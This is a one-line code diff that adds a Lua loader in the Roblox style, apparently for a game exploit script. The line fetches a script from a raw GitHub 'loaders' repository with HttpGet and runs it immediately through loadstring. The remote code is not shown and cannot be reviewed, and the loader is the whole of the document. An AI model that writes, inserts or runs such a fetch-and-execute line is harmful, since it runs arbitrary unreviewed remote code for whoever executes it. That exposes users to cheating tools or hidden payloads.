@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/hide-in-pixels-spam7-zax5fqg3j1kn52.lua"))()
